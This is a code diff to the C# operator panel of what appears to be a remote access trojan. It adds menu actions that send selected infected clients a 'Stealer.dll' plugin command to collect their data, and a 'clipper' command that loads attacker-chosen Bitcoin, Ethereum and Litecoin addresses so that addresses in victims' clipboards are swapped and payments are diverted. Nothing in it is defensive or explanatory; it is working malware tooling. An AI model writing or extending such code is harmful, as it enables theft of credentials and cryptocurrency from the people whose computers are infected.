@@ -20,6 +20,7 @@ using cGeoIp;
 using System.Resources;
 using System.ComponentModel;
 using System.Globalization;
+using System.Net;
 
 namespace Server
 {
@@ -128,10 +129,16 @@ namespace Server
 
         #endregion
 
+
+        public void DownloadProgress(object sender, DownloadProgressChangedEventArgs e)
+        {
+            string str = $"{e.UserState}    downloaded {e.BytesReceived} of {e.TotalBytesToReceive} bytes. " +
+                $"{e.ProgressPercentage} % complete...";
+            toolStripStatusLabel2.Text = $"{e.ProgressPercentage} % complete...";
+        }
         #region Form Events
         private async void Form1_Load(object sender, EventArgs e)
         {
-
             ListviewDoubleBuffer.Enable(listView1);
             ListviewDoubleBuffer.Enable(listView2);
             ListviewDoubleBuffer.Enable(listView3);
@@ -2301,19 +2308,50 @@ namespace Server
         {
             try
             {
+                MsgPack packet = new MsgPack();
+                packet.ForcePathObject("Pac_ket").AsString = "report";
+
                 MsgPack msgpack = new MsgPack();
                 msgpack.ForcePathObject("Pac_ket").AsString = "plu_gin";
                 msgpack.ForcePathObject("Dll").AsString = (GetHash.GetChecksum(@"Plugins\Stealer.dll"));
+                
+                msgpack.ForcePathObject("Msgpack").SetAsBytes(packet.Encode2Bytes());
 
                 foreach (Clients client in GetSelectedClients())
                     ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
-                new HandleLogs().Addmsg("Stealing data...(May take long time.)", Color.Black);
+                new HandleLogs().Addmsg("Stealing data...(May take long time.)", Color.Blue);
             }
             catch (Exception ex)
             {
                 MessageBox.Show(ex.Message);
                 return;
             }
+        }
+
+        private void installClipperToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            MsgPack packet = new MsgPack();
+            packet.ForcePathObject("Pac_ket").AsString = "clipper";
+            packet.ForcePathObject("btc").AsString = Properties.Settings.Default.BtcAddr;
+            packet.ForcePathObject("eth").AsString = Properties.Settings.Default.EthAddr;
+            packet.ForcePathObject("ltc").AsString = Properties.Settings.Default.LtcAddr;
+
+            MsgPack msgpack = new MsgPack();
+            msgpack.ForcePathObject("Pac_ket").AsString = "plu_gin";
+            msgpack.ForcePathObject("Dll").AsString = (GetHash.GetChecksum(@"Plugins\Stealer.dll"));
+            msgpack.ForcePathObject("Msgpack").SetAsBytes(packet.Encode2Bytes());
+
+            foreach (Clients client in GetSelectedClients())
+                    ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
+            new HandleLogs().Addmsg("Installing clipper...", Color.Blue);
+        }
+
+        private void initPluginsToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            MsgPack msgpack = new MsgPack();
+            msgpack.ForcePathObject("Pac_ket").AsString = "init_reg";
+            foreach (Clients client in GetSelectedClients())
+                ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
         }
     }
 }
